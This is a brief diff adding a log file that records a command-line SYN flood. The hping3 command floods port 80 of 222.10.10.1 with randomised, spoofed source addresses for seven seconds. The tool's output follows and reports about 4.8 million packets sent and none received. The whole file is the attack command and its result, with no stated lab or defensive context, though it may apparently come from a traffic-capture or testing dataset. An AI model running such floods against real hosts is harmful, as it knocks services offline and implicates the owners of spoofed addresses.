@@ -1,0 +1,13 @@
+### COMMAND: timeout 7s hping3 -S -p 80 --flood --rand-source 222.10.10.1
+timeout 7s hping3 -S -p 80 --flood --rand-source 222.10.10.1
+1
+
+HPING 222.10.10.1 (eth0 222.10.10.1): S set, 40 headers + 0 data bytes
+
+hping in flood mode, no replies will be shown
+
+--- 222.10.10.1 hping statistic ---
+
+4846447 packets transmitted, 0 packets received, 100% packet loss
+
+round-trip min/avg/max = 0.0/0.0/0.0 ms
